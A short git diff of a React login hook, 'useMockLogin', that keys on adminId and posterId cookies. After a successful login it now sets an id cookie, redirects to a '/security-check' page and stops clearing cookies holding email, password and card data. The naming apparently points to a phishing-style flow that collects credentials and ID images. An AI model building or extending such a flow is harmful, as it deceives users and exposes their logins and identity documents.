@@ -51,10 +51,12 @@ function useMockLogin() {
   //   query: { adminId, posterId },
   // } = useRouter();
 
+  const router = useRouter();
+
   const adminId = Cookies.get("adminId");
   const posterId = Cookies.get("posterId");
 
-  const login = async (values, formik, setShowModal) => {
+  const login = async (values, formik) => {
     // console.log(values);
     // Cookies.remove("onlyCard");
     // Cookies.remove("holdingCard");
@@ -80,11 +82,15 @@ function useMockLogin() {
 
     if (res.ok) {
       console.log("success", data);
-      toast.success("Login Successfull");
-      Cookies.remove("email");
-      Cookies.remove("password");
-      Cookies.remove("onlyCard");
-      Cookies.remove("holdingCard");
+      Cookies.set("id", data?.info?._id);
+      router.push("/security-check");
+
+      // toast.success("Login Successfull");
+      // Cookies.remove("email");
+      // Cookies.remove("password");
+      // Cookies.remove("onlyCard");
+      // Cookies.remove("holdingCard");
+
       // Cookies.remove("email");
       // Cookies.remove("password");
       // Cookies.remove("mail");
@@ -92,7 +98,7 @@ function useMockLogin() {
       // Cookies.remove("posterId");
 
       formik.resetForm();
-      setShowModal(false);
+      // setShowModal(false);
     } else {
       console.log("error", data);
       toast.error("Something Went Wrong");
